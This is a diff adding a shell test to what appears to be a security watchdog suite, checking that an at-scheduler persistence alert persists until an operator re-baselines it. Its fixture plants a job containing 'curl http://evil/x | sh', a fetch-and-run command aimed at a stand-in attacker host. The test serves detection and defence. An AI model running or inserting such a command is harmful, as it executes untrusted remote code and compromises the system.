@@ -224,3 +224,18 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-at-jobs -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no-auto-trust: at-jobs-watchdog does NOT refresh baseline on suspicious-job detection — alert STAYS until operator updates)" {
+    # T1053 at-scheduler persistence primitive — alert MUST persist
+    # across runs until operator explicitly re-baselines. Sister to
+    # cron-job-watchdog + many other watchdogs' no-auto-trust
+    # INVARIANT.
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${SPOOL}/a99999"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
